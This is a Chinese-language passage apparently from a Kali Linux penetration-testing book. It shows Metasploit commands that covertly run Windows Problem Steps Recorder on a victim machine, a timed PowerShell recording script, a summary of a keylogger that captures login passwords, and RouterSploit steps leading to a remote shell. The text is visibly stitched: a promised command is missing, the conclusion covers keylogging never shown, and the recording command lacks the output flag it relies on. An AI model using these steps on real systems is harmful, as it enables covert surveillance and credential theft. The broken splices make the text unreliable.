
# Windows 包含一个非常棒的辅助程序，你可能听过它，被称为“问题记录器”（PSR）

微软制作此程序是为了帮助故障排除人员逐步查看用户正在进行的操作。如果用户遇到了无法描述或技术支持无法直观可视化的计算机问题，所有支持人员只需要运行 PSR 即可。当 PSR 运行时，它会自动开始捕获用户点击的所有内容，还会记录用户正在执行的操作。完成后，数据将保存为 HTML 格式并压缩，用户只需将其发送给技术部门即可。老实说，我以前没听说过 PSR，直到一段时间在 Twitter 上有人提到该工具的措辞从隐私角度来看有点令人担忧。确实很毛骨悚然，但我想如果你可以远程运行它，它将是渗透测试的绝佳工具。嗯，你确实可以！虽然将 PSR 作为攻击手段并不是新主意，但我搜索发现，多年来它多次以这种方式被提到。

## 正常使用“步骤记录器”

要正常使用“步骤记录器”，你只需要点击 Windows 中的开始按钮，并在搜索框中输入“psr”。然后点击“步骤记录器”或直接运行 `psr.exe`。当你这样做时，会弹出一个小型界面：点击“开始”。PSR 随后会立即开始截图。每当拍摄截图时，它都会显示一个红色指针。完成后按“停止录制”。你将看到一份关于你所做一切的精美报告。然后你还可以选择保存该报告。

## 使用 Metasploit 远程使用 PSR

在安全测试环境中，通过命令行，PSR 与 Metasploit 配合得非常好。有几种方法我们可以通过 Metasploit 使用自动化脚本使用 PSR，我将向你展示手动方法。我们将从 Windows 7 虚拟机与我们的 Kali Linux 系统之间的一个活动会话开始：

1. 输入 `shell` 进入命令提示符。
2. 输入 `psr /start /gui 0 output [路径]` 如下：

```
meterpreter > shell
Process 3720 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan\Desktop>psr /start /gui 0
```

3. 在 Windows 7 系统上打开浏览器进行浏览。
4. 浏览几秒钟后，输入 `psr /stop`。

上面的命令启动了 PSR，运行 (`/gui 0`) 时会弹出一个窗口，录制时显示红色指针。输入 `/stop` 命令后，文件将以 `cool.zip` 的形式保存到桌面。此时 Windows 7 桌面上会出现一个新文件。该文件包含了截图，底部是详细的操作步骤文本日志：

> Problem Step 1: 用户在“Mozilla Firefox - Start Page”中输入
>
> Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
>
> UI Elements: Mozilla Firefox - Mozilla Window
>
> Problem Step 2: 用户点击“puppies - Yahoo Search Results”
>
> Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
>
> UI Elements: Search Results - Mozilla firefox
>
> Problem Step 3: 用户点击“Sad Puppy - Wallpaper (972648)”
>
> Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
>
> UI Elements: Yahoo Search Results - Sad Puppy
>
> Problem Step 4: 用户在“Sad Puppy Wallpaper”上点击“浏览器标签页（工具栏）”
>
> Program: Firefox, 43.0.1, Microsoft Corporation, EXE.
>
> UI Elements: Browser tabs, Sad Puppy Wallpaper (972648) - Mozilla
>
> Problem Step 5: 用户点击“桌面（列表）”“程序管理器”
>
> Program: Windows Explorer, 6.1.7601.16368 (with_ru9701325), Microsoft Corporation
>
> UI Elements: Desktop, FolderView, SysListView, Program Manager

通过几个命令，我们就能使用问题记录器捕获远程测试！现在我使用 PSR 比 Metasploit 内置的截图功能还要好。特别是包含了详细的操作日志。你可以让这种攻击变得更高级。例如，我创建了一个包含以下命令的文件：

```
psr.exe /start /gui 0 /output C:\Users\Dan\Desktop\cool.zip;
Start-Sleep -s 20
psr.exe /stop
```

如前，第一个命令启动 PSR。`Start-Sleep -s 20` 命令让脚本在执行停止之前暂停 20 秒。然后我对文本文件进行了 Base64 编码（基于 PowerShell 的攻击在我的《Kali Linux 高级安全测试》书中有详细介绍），并在命令提示符中作为 PowerShell 命令运行它：

每天或由系统事件启动和停止。这些是更高级的功能，我留给读者去进一步探索。

## 结论

在本节中，我们演示了如何在 Kali 中使用 Metasploit 从远程系统捕获击键。我们还发现，键盘记录器通常不会记录登录密码，因为 Windows 登录服务使用了不同的键盘缓冲区。但如果我们将键盘记录器移动到该进程中，我们确实可以捕获到登录凭据。

我们还介绍了一个实用的程序，它可以将会话迁移到 Winlog 进程，监控系统的空闲时间，将其锁定，并在用户尝试重新登录时捕获密码。`Lockout_Keylogger` 自动化了从开始到结束的整个过程。用户离开电脑，脚本等待特定的空闲时间，然后将计算机设置为锁定模式。接着，当他重新登录时，程序已经设置好扫描所按的按键。

最后，我们涵盖了问题步骤记录器（Problem Steps Recorder）。我们看到这个微软内置的支持工具如何作为一种远程渗透测试工具，提供屏幕截图流和用户操作的分步日志。虽然 PSR 可以在组策略中禁用，但我没有在任何地方看到如何完全卸载它。

防止此类攻击的最佳防御是从源上阻止远程连接的创建，因此要采用标准的安全规范。保持您的操作系统和杀毒软件更新到最新版本。不要打开未经请求的、意外或可疑的邮件附件。避免可疑链接，警惕短 URL，并始终安全上网。

# 路由器与 Wi-Fi 安全测试

## 第 24 章：无线网络攻击

无线网络和 Wi-Fi 设备从未停止渗透家庭和商业领域。针对 Wi-Fi 网络的威胁已为人知，尽管人们已经做出一些努力来锁定无线网络，但仍有一些网络处于开放状态或安全防护不足。新的 WPA3 标准在实施后将极大增强安全性，但正如安全世界的其他任何事物一样，要预料会有新的战术。猫鼠游戏仍在继续。

在本节中，我们将讨论无线安全和一些常见的 Wi-Fi 误区。我们将查看一些白帽黑客可以用来检查其无线网络安全性的流行工具和技术。有时无线网络可以被修改以欺骗用户，因此我们还将涵盖渗透测试员（不幸的是，黑客）如何使用简单的网卡设置虚假的接入点（AP）。

## 无线安全协议

消息正在传出，无线制造商正为他们的设备配置更优安全性作为默认设置，但仍有大量无线网络的安全性极其糟糕。保护你的无线网络，最重要的因素之一就是无线安全协议。你有 `None`（无），这基本上意味着你敞开大门让任何人访问你的网络。`WEP` 在很久以前就被破解了，基本上就像是你锁了门，但把钥匙留在了门垫下，还贴了一张大字写着“钥匙在垫下”。`WPA` 和 `WPA2` 好一些，但仍然存在问题。新的 `WPA3` 是建议采用的网络安全标准。它取代了已有 14 年历史的 WPA2。虽然 WPA3 设备刚刚开始认证和制造，第一批设备应该在 2018 年底或 2019 年初上市。

过去，最大的问题是人们使用开放或 WEP 来保护他们的 Wi-Fi 网络。现在最大的问题是，WPA2 密码在大多数情况下相当容易破解。大多数人在设备上使用简单的密码，并在共享的 Wi-Fi 上基本上定义了一个简单的密码短语。难以置信的是，你仍然看到厂家出的新设备带有极其简单的设备密码。我刚刚收到一个全新的路由器，默认密码竟然是 `admin`。黑客正利用人们要么不知道如何更改、要么懒得更改默认密码的漏洞，并利用路由器进行大规模僵尸攻击。他们使用默认密码接管大量路由器，然后将它们用于分布式拒绝服务或其他攻击。2018 年 6 月，VPNFilter 接管了超过 500,000 台路由器！

你也经常听到在常用路由器中发现严重漏洞的消息。在大多数情况下，它们是网络的第一道防线。因此，我认为花些时间涵盖基于路由器的攻击是很重要的。在本章中，我们将查看针对路由器的几种方法，在接下来的章节中我们将涵盖 Wi-Fi 网络。对于本节，你需要一个能够进入监控模式的无线卡。许多 Wi-Fi 适配器都能做到，但有些不能。如果你计划购买一个，请做些研究，以确定你的 Wi-Fi 适配器是否可以在监控模式下配合 Kali 工作。我将使用 TP-Link-WN722n（版本 2 不兼容 Kali）USB Wi-Fi 适配器，它与 Kali 配合得很好。有关 Wi-Fi 适配器如何与 Kali 工作的额外信息，请参阅资源部分。此外，对于本节中的某些测试，使用额外的路由器（如果你手头有一个）可能会更容易。

## 路由器密码与固件更新

在所有设备中，路由器是需要使用长复杂密码进行保护的最重要设备之一。存在许多网站，包含网络设备的默认密码。一个“路过黑客”（寻找容易攻入目标的人）会做的第一件事就是尝试对面向互联网的设备使用默认凭据。不幸的是，很多时候他们确实得逞。

我刚刚点击了 D-Link 一键破解漏洞程序之一，它立即要求设置新密码。如果我输入密码并点击“确定”，它将尝试使用漏洞程序来重置本地 D-Link 路由器的密码。安全专业人员理解其影响至关重要，因为许多漏洞程序在执行时不会向用户请求进一步确认。

如前文所述，该网站似乎已经不再活跃更新了，尽管 Routerwn 的 Twitter 推馈确实有一些关于路由器漏洞的优质推文（https://twitter.com/Routerpn）。接下来，让我们来看 Kali Linux 中一个较新的路由器漏洞利用工具包：`RouterSploit`。

## RouterSploit

**工具作者：** Reverse Shell Security

**工具网站：** https://github.com/threat9/routersploit

`RouterSploit` 或路由器漏洞利用框架是一个类似于 Metasploit 的工具，专门用于测试嵌入式设备。它的功能与 Metasploit 类似，包含了扫描器、负载（payloads）以及漏洞程序（exploits）。有趣的是，该工具还支持低功耗蓝牙（BLE）。工具网站建议你频繁检查工具更新，因为它正处于深度开发中，并不断添加新功能。

### 安装 RouterSploit

该工具位于 Kali 仓库中，甚至在 Kali 网站上有一个工具页面，但目前 Kali 默认并未安装它。我通常建议用户始终从 Kali 仓库安装工具，手动安装可能会破坏 Kali 或其他工具。尽管你无法从 Kali 仓库获取最新版本，且由于该工具更新频繁，我是按照工具作者的说明安装的。以下是写本文时的说明，请务必检查工具网页以获取更改：

```
apt-get install python3-pip
git clone https://www.github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
```

运行该工具的方法：

```bash
python3 rsf.py
```

### RouterSploit 界面

Threat9 开发嵌入式设备漏洞利用框架

```
代号：I Knew You Were Trouble
版本：3.3.0
首页：https://www.threat9.com - @threatnine
加入 Slack 群：https://www.threat9.com/slack
```

加入 Threat9 Beta 测试计划 - https://www.threat9.com

漏洞程序：128 扫描器：4 凭据：165 通用：4 负载：32 编码器：6
rsf >

工具作者建议你频繁更新程序：

在 `routersploit` 子目录中，执行 `git pull`。

### 使用 RouterSploit

该工具的布局与 Metasploit 类似。你可以使用 `show` 命令查看可用选项和模块。选项包括：

- 漏洞程序 (Exploits)
- 信息 (Info)
- 扫描器 (Scanners)
- 凭据 (Creds)
- 字典列表 (Wordlists)
- 编码器 (Encoders)

因此，要查看可用扫描器：

输入 `show scanners`。

```
rsf > show scanners
scanners/autopwn
scanners/routers/router_scan
scanners/cameras/camera_scan
scanners/misc/misc_scan
```

所有扫描工具都已列出。

使用某个模块的步骤与 Metasploit 相同：

1. 使用模块 (`use` the module)
2. 显示选项 (`show options`)
3. 设置选项
4. 设置负载和其他选项
5. 执行 (`run` 或 `exploit`)

与 Metasploit 一样，你可以输入 `back` 返回 `rsf` 提示符，或输入 `exit` 退出。让我们运行路由器扫描器来查看程序是如何工作的。路由器扫描会扫描目标并检查其是否受到 RouterSploit 的漏洞。它还会检查默认密码。

输入 `use scanners/routers/router_scan`。

然后输入 `show options`。

```
rsf > use scanners/routers/router_scan
rsf (Router Scanner) > show options

Target options:
Name | Current settings | Description
|---|---|---|
target | | 目标 IPv4 或 IPv6 地址

Module options:
Name | Current settings | Description
|---|---|---|
http_port | 80 | 目标 Web 端口
https_ssl | false | 启用 HTTPS: true/false
ftp_port | 21 | 目标 FTP 端口 (默认: 21)
```

现在设置你需要的选项。我知道我的路由地址，所以我将填充 `target` 设置。

`set target 192.168.1.1`

然后直接输入 `run`。

```
rsf (Router Scanner) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Router Scanner) > run
[+] Running module...

[*] Starting vulnerability check...
[+] thread-0 thread is starting...
[+] thread-1 thread is starting...
[+] thread-2 thread is starting...
[+] thread-3 thread is starting...
[+] thread-4 thread is starting...
[-] 192.168.1.1:80 http exploits/generic/heartbleed is not vulnerable
```

如果你正在验证你的路由器是否安全，那么你会在目标路由器上看到如下内容：

```
[-] 192.168.1.1 Could not confirm any vulnerability
[-] 192.168.1.1 Could not find default credentials
```

如果路由器存在漏洞，RouterSploit 将列出可用的漏洞程序以及哪些默认凭据有效。然后你可以使用带有负载的漏洞模块，如果路由器存在远程代码执行漏洞，即可获取远程 shell。

使用漏洞模块：

1. 使用漏洞程序 (`use` the exploit)
2. 设置目标 (`set` the target)
3. 输入 `check` 检查是否存在漏洞
4. 输入 `run` 执行
5. 输入 `show payloads` 查看负载
6. 设置 `LHOST`
7. 执行漏洞 (`run` the exploit)

如果漏洞程序运行，你将获得一个命令行提示符。该工具还支持低功耗蓝牙。工具网站建议你检查更新。它可以监控 Wi-Fi。接下来，让我们看看一些 Wi-Fi 监控工具。

## 使用 Aircrack-ng 查看无线网络

**工具作者：** Thomas, Christophe Devine

**工具网站：** http://www.aircrack-ng.org/

`Aircrack-ng` 是一些常用的命令行程序。Wi-Fi 工具可以用于监控、测试和破解 Wi-Fi。让我们从 `Airmon-ng` 开始。

1. 首先，你需要插入无线网卡并通过“可移动设备”将其连接到 Kali。
2. 接下来，打开终端并输入命令 `ifconfig`。你应该能看到你的网卡为 `wlan0`：

```
wlan0: flags=4099<UP,BROCAST,MULTICAST> mtu 1500
  ether f8:dl:11:00
RX packets 0 bytes (0.0 B)
RX errors 0 dropped 0 overruns 0
TX packets 0 bytes (0.0 B)
TX errors 0 dropped 0 overruns 0
```
